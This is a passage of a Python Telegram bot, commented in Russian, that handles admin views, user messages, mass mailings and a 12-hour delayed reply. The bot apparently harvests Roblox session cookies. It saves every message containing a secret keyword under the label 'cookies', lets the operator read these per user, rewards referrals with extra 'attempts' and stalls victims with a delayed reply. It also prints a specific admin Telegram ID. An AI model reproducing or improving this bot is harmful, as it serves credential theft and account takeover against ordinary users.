        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    # ===================================================
    # ВСЕ СООБЩЕНИЯ ПОЛНОСТЬЮ (без обрезки)
    # ===================================================
    elif data.startswith("chat_user_full_"):
        target_user_id = data.replace("chat_user_full_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_user_messages(target_user_id)
        if not messages:
            await query.edit_message_text(get_text(user_id, "no_messages", name=name, username=username))
            return
        
        text = get_text(user_id, "chat_full_title", name=name, username=username, user_id=target_user_id, total=len(messages))
        
        for msg in messages[:30]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            if KEYWORD in msg_text:
                text += f"🔑 **{time}**\n💬 {msg_text}\n"
            else:
                text += f"🕐 {time}\n💬 {msg_text}\n"
            text += "─" * 30 + "\n"
        
        if len(messages) > 30:
            text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-30)
        
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "keyword_only"), callback_data=f"chat_user_keyword_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "send_msg_to_user"), callback_data=f"send_msg_to_user_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "back"), callback_data=f"chat_user_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    # ===================================================
    # ТОЛЬКО КЛЮЧЕВЫЕ СЛОВА
    # ===================================================
    elif data.startswith("chat_user_keyword_"):
        target_user_id = data.replace("chat_user_keyword_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_keyword_messages(target_user_id)
        if not messages:
            await query.edit_message_text(get_text(user_id, "no_keyword_messages", name=name, username=username))
            return
        
        text = get_text(user_id, "chat_keyword_title", name=name, username=username, user_id=target_user_id, total=len(messages))
        
        for msg in messages[:30]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            text += f"🕐 {time}\n💬 {msg_text}\n"
            text += "─" * 30 + "\n"
        
        if len(messages) > 30:
            text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-30)
        
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "message_received").split(".")[0], callback_data=f"chat_user_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "send_msg_to_user"), callback_data=f"send_msg_to_user_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="select_user_for_chat")],
            [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return
    
    elif data.startswith("view_user_"):
        target_user_id = data.replace("view_user_", "")
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        username = user_data.get("username", "no_username")
        
        messages = get_keyword_messages(target_user_id)
        if not messages:
            await query.edit_message_text(get_text(user_id, "no_keyword_messages", name=name, username=username))
            return
        
        text = "📋 " + get_text(user_id, "cookies") + " " + get_text(user_id, "from") + f" {name} (@{username}):\n\n"
        
        for msg in messages[:30]:
            msg_text = msg.get("text", "")
            time = msg.get("timestamp", "")
            text += f"💬 {msg_text}\n🕐 {time}\n"
            text += "─" * 30 + "\n"
        
        if len(messages) > 30:
            text += f"\n... " + get_text(user_id, "show_more", count=len(messages)-30)
        
        keyboard = [
            [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
            [InlineKeyboardButton(get_text(user_id, "send_msg_to_user"), callback_data=f"send_msg_to_user_{target_user_id}")],
            [InlineKeyboardButton(get_text(user_id, "back"), callback_data="view_keyword_messages")],
            [InlineKeyboardButton(get_text(user_id, "message_received").split(".")[0], callback_data=f"chat_user_{target_user_id}")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        if len(text) > 4096:
            parts = [text[i:i+4000] for i in range(0, len(text), 4000)]
            for part in parts:
                await query.message.reply_text(part)
            await query.message.reply_text("⬅️ " + get_text(user_id, "back"), reply_markup=reply_markup)
        else:
            await query.edit_message_text(text, reply_markup=reply_markup)
        return

# ===================================================
# ВСПОМОГАТЕЛЬНАЯ ФУНКЦИЯ ДЛЯ ПОКАЗА ГЛАВНОГО МЕНЮ
# ===================================================

async def show_main_menu_by_query(query, context, user_id):
    user = query.from_user
    user_name = user.first_name
    attempts = get_user_attempts(user_id)
    referrals = get_referral_count(user_id)
    
    # ✅ ОБНОВЛЯЕМ ДАННЫЕ ПОЛЬЗОВАТЕЛЯ
    save_all_user(
        user_id=user_id,
        username=user.username or "no_username",
        first_name=user.first_name or "Unknown"
    )
    
    keyboard = [
        [
            InlineKeyboardButton(get_text(user_id, "device"), callback_data="device"),
            InlineKeyboardButton(get_text(user_id, "cookies"), callback_data="cookies"),
        ],
        [
            InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral"),
            InlineKeyboardButton(get_text(user_id, "buy_roblox"), callback_data="buy_roblox"),
        ],
        [
            InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language"),
        ]
    ]
    
    if user_id == YOUR_USER_ID:
        keyboard.append([
            InlineKeyboardButton(get_text(user_id, "all_users"), callback_data="view_all_users"),
            InlineKeyboardButton(get_text(user_id, "keyword_users"), callback_data="view_keyword_users_only"),
        ])
        keyboard.append([
            InlineKeyboardButton(get_text(user_id, "stats"), callback_data="view_stats"),
            InlineKeyboardButton(get_text(user_id, "chat_user"), callback_data="select_user_for_chat"),
        ])
        keyboard.append([
            InlineKeyboardButton(get_text(user_id, "give_attempts"), callback_data="give_attempts_menu"),
            InlineKeyboardButton(get_text(user_id, "mailing"), callback_data="send_mailing"),
        ])
        keyboard.append([
            InlineKeyboardButton(get_text(user_id, "delete_users"), callback_data="delete_users_menu"),
        ])
    
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(
        get_text(user_id, "bot_start", name=user_name, attempts=attempts, referrals=referrals),
        reply_markup=reply_markup
    )

# ===================================================
# ОБРАБОТЧИК ТЕКСТОВЫХ СООБЩЕНИЙ
# ===================================================

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_message = update.message.text
    user = update.effective_user
    user_id = user.id
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    # Проверяем, находимся ли в режиме отправки сообщения пользователю
    if user_id == YOUR_USER_ID and 'chat_target' in context.user_data:
        if user_message == "/cancel":
            del context.user_data['chat_target']
            await update.message.reply_text("❌ Отправка сообщения отменена.")
            return
        
        target_user_id = context.user_data['chat_target']
        all_users = get_all_users()
        user_data = all_users.get(target_user_id, {})
        name = user_data.get("first_name", "Unknown")
        
        try:
            await context.bot.send_message(
                chat_id=int(target_user_id),
                text=f"📩 {get_text(user_id, 'message_from_admin')}\n\n{user_message}"
            )
            await update.message.reply_text(
                f"✅ {get_text(user_id, 'message_sent_to_user')}\n\n👤 {name}"
            )
        except Exception as e:
            await update.message.reply_text(f"❌ Ошибка отправки: {e}")
        
        del context.user_data['chat_target']
        return
    
    # Проверяем, находимся ли в режиме ввода количества попыток
    if user_id == YOUR_USER_ID and 'give_attempts_target' in context.user_data:
        try:
            count = int(user_message)
            if count <= 0:
                await update.message.reply_text(get_text(user_id, "invalid_number"))
                return
            
            target_user_id = context.user_data['give_attempts_target']
            all_users = get_all_users()
            user_data = all_users.get(target_user_id, {})
            name = user_data.get("first_name", "Unknown")
            username = user_data.get("username", "no_username")
            
            new_attempts = add_attempts(target_user_id, count)
            
            del context.user_data['give_attempts_target']
            
            await update.message.reply_text(
                get_text(user_id, "give_attempts_success", name=name, username=username, user_id=target_user_id, count=count, new_attempts=new_attempts)
            )
            return
        except ValueError:
            await update.message.reply_text(get_text(user_id, "enter_number"))
            return
    
    # Проверяем, находится ли админ в режиме рассылки
    if user_id == YOUR_USER_ID and 'mailing_type' in context.user_data:
        mailing_type = context.user_data['mailing_type']
        
        if user_message == "/cancel":
            del context.user_data['mailing_type']
            await update.message.reply_text(get_text(user_id, "mailing_canceled"))
            return
        
        if mailing_type == 'all':
            users = get_all_users()
        else:
            users = get_keyword_users()
        
        if not users:
            await update.message.reply_text(get_text(user_id, "mailing_no_users"))
            del context.user_data['mailing_type']
            return
        
        sent = 0
        failed = 0
        
        status_msg = await update.message.reply_text(get_text(user_id, "mailing_start", count=len(users)))
        
        for user_id_str, user_data in users.items():
            try:
                await context.bot.send_message(
                    chat_id=int(user_id_str),
                    text=user_message
                )
                sent += 1
                await asyncio.sleep(0.5)
            except Exception as e:
                failed += 1
                print(f"❌ Ошибка отправки {user_id_str}: {e}")
        
        await status_msg.edit_text(
            get_text(user_id, "mailing_success", sent=sent, failed=failed, total=len(users))
        )
        
        del context.user_data['mailing_type']
        return
    
    # ✅ СОХРАНЯЕМ ПОЛЬЗОВАТЕЛЯ ПРИ ЛЮБОМ СООБЩЕНИИ
    save_all_user(
        user_id=user.id,
        username=user.username or "no_username",
        first_name=user.first_name or "Unknown"
    )
    
    # Обычная обработка сообщений (не рассылка)
    if KEYWORD in user_message:
        if not use_attempt(user_id):
            keyboard = [
                [InlineKeyboardButton(get_text(user_id, "referral"), callback_data="referral")],
                [InlineKeyboardButton(get_text(user_id, "change_language"), callback_data="change_language")],
                [InlineKeyboardButton(get_text(user_id, "back_to_menu"), callback_data="back_to_menu")]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text(
                get_text(user_id, "no_attempts"),
                reply_markup=reply_markup
            )
            return
        
        remaining = get_user_attempts(user_id)
        
        save_keyword_user(
            user_id=user.id,
            username=user.username or "no_username",
            first_name=user.first_name or "Unknown"
        )
        save_message(
            user_id=user.id,
            username=user.username or "no_username",
            first_name=user.first_name or "Unknown",
            text=user_message,
            timestamp=timestamp
        )
        print(f"\n🔑 [KEYWORD] [{timestamp}] {user.first_name} (@{user.username or 'no_username'})")
        await update.message.reply_text(
            get_text(user_id, "keyword_received", remaining=remaining)
        )
        asyncio.create_task(send_delayed_message(update.effective_chat.id, context, user_id))
    else:
        if is_keyword_user(user.id):
            save_message(
                user_id=user.id,
                username=user.username or "no_username",
                first_name=user.first_name or "Unknown",
                text=user_message,
                timestamp=timestamp
            )
            print(f"\n💬 [{timestamp}] {user.first_name} (@{user.username or 'no_username'}): {user_message}")
            await update.message.reply_text(get_text(user_id, "message_received"))
        else:
            await update.message.reply_text(get_text(user_id, "wrong_cookie"))

# ===================================================
# ОБРАБОТЧИК КОМАНДЫ /cancel
# ===================================================

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    if 'give_attempts_target' in context.user_data:
        del context.user_data['give_attempts_target']
        await update.message.reply_text(get_text(user_id, "attempts_canceled"))
        return
    
    if 'chat_target' in context.user_data:
        del context.user_data['chat_target']
        await update.message.reply_text("❌ Отправка сообщения отменена.")
        return
    
    if user_id == YOUR_USER_ID and 'mailing_type' in context.user_data:
        del context.user_data['mailing_type']
        await update.message.reply_text(get_text(user_id, "mailing_canceled"))
    else:
        await update.message.reply_text("No active operation.")

# ===================================================
# ФУНКЦИЯ ЗАДЕРЖКИ (12 часов)
# ===================================================

async def send_delayed_message(chat_id, context, user_id):
    delay_seconds = 12 * 3600
    try:
        await asyncio.sleep(delay_seconds)
        await context.bot.send_message(
            chat_id=chat_id,
            text=get_text(user_id, "delayed_message")
        )
    except Exception as e:
        print(f"Ошибка при отправке отложенного сообщения: {e}")

# ===================================================
# ЗАПУСК БОТА
# ===================================================

def main():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cancel", cancel))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    
    print("🤖 Бот запущен! Нажмите Ctrl+C для остановки.")
    print("📢 Обязательная подписка: @reviewsh1pe")
    print("📩 Админские кнопки видны только тебе (ID: 1341594703)")
    print("🌐 Поддержка языков: Русский, English")
    print("🎯 У каждого пользователя 1 бесплатная попытка")
    print("👥 За каждого приглашенного друга +1 попытка")
    print("⏰ Задержка перед ответом: 12 часов")
    print("📨 Для рассылки нажми кнопку 'Рассылка' в меню")
    print("🗑 Для удаления пользователей нажми кнопку 'Удалить пользователей' в меню")
    print("🎯 Для выдачи попыток нажми кнопку 'Выдать попытки' в меню")
    print("✉️ Для отправки сообщения пользователю - в чате с пользователем нажми 'Отправить сообщение'")
    app.run_polling()

if __name__ == "__main__":
    main()
